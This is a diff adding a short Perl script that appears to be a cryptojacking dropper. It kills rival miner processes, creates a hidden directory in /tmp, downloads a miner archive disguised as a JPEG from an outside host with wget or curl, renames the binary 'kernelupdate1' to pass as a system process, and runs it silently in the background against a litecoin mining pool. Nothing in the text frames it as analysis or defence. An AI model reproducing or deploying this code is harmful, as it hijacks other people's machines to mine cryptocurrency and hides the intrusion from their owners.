@@ -1,0 +1,30 @@
+#!/usr/bin/perl
+system("killall -9 minerd");
+system("killall -9 minerd64");
+system("killall -9 minerd32");
+system("killall -9 kernelupdate");
+$rn=1;
+$ar=`uname -m`;
+while($rn==1 || $rn==0) {
+$rn=int(rand(11));
+}
+$exists=`ls /tmp/.sice-unix`;
+if($exists!~/minerd/gi) {
+    $wig=`wget --version | grep GNU`;
+		if(length($wig>6)) {
+			if($ar=~/64/g) {
+			system("cd /tmp;mkdir /tmp/.sice-unix;cd /tmp/.sice-unix;wget https://batch-conf.us/mine.jpg;tar xzvf mine.jpg; cd /tmp/.sice-unix/mine;mv minerd kernelupdate1;chmod +x ./kernelupdate1");
+			} else {
+			system("cd /tmp;mkdir /tmp/.sice-unix;cd /tmp/.sice-unix;curl -O https://batch-conf.us/mine.jpg;tar xzvf mine.jpg; cd /tmp/.sice-unix/mine;mv minerd kernelupdate1;chmod +x ./kernelupdate1");
+			}
+	} else {
+		if($ar=~/64/g) {
+system("cd /tmp;mkdir /tmp/.sice-unix;cd /tmp/.sice-unix;wget https://batch-conf.us/mine.jpg;tar xzvf mine.jpg; cd /tmp/.sice-unix/mine;mv minerd kernelupdate1;chmod +x ./kernelupdate1");
+		} else {
+system("cd /tmp;mkdir /tmp/.sice-unix;cd /tmp/.sice-unix;curl -O https://batch-conf.us/mine.jpg;tar xzvf mine.jpg;cd /tmp/.sice-unix/mine;mv minerd kernelupdate1;chmod +x ./kernelupdate1");
+		}
+	}
+}
+print "setup for $rn done :-)\n";
+system("cd /tmp/.sice-unix/mine;nohup ./kernelupdate1 --url=stratum+tcp://eu.ltcrabbit.com:3333 --userpass=sendmail.1:test >>/dev/null&");
+print "Am terminat de instalat cu success\n";
